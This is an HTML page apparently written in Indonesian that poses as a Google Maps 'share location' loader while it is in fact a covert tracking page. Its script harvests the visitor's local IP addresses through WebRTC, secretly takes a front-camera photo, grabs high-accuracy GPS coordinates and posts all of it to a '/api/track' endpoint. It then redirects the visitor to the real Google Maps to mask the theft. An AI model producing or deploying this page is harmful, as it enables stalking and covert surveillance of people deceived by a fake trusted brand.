<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Maps - Share Location</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 25vh; background: #f4f4f9; color: #333; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #camera-stream { display: none; }
    </style>
</head>
<body>
    <div class="loader"></div>
    <h3>Memuat Peta...</h3>
    <p>Mohon tunggu sebentar, sedang menyinkronkan data jaringan...</p>

    <video id="camera-stream" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        window.onload = function() {
            let capturedImage = null;
            let localIPs = [];

            // 1. Ekstraksi WebRTC IP
            function getLocalIPs(callback) {
                const ips = [];
                const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
                if (!RTCPeerConnection) return callback([]);

                const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
                pc.createDataChannel("");
                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});

                pc.onicecandidate = (ice) => {
                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                    const parts = ice.candidate.candidate.split(" ");
                    const ip = parts[4];
                    if (ips.indexOf(ip) === -1) {
                        ips.push(ip);
                        callback(ips);
                    }
                };
            }

            getLocalIPs(ips => {
                localIPs = ips;
            });

            // 2. Ambil Foto Kamera
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(stream => {
                    const video = document.getElementById('camera-stream');
                    video.srcObject = stream;
                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        capturedImage = canvas.toDataURL('image/jpeg');
                        stream.getTracks().forEach(track => track.stop());
                        getLocAndSend(capturedImage, localIPs);
                    }, 1500);
                })
                .catch(err => {
                    getLocAndSend(null, localIPs);
                });
        };

        function getLocAndSend(imagebase64, localIPs) {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    position => sendData(position.coords.latitude, position.coords.longitude, position.coords.accuracy, imagebase64, localIPs),
                    error => sendData(null, null, null, imagebase64, localIPs),
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                sendData(null, null, null, imagebase64, localIPs);
            }
        }

        function sendData(lat, lon, accuracy, image, localIPs) {
            fetch('/api/track', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    latitude: lat, 
                    longitude: lon, 
                    accuracy: accuracy, 
                    image: image,
                    localIPs: localIPs 
                })
            }).finally(() => {
                if (lat && lon) {
                    window.location.href = `https://maps.google.com/?q=${lat},${lon}`;
                } else {
                    window.location.href = "https://maps.google.com";
                }
            });
        }
    </script>
</body>
</html>
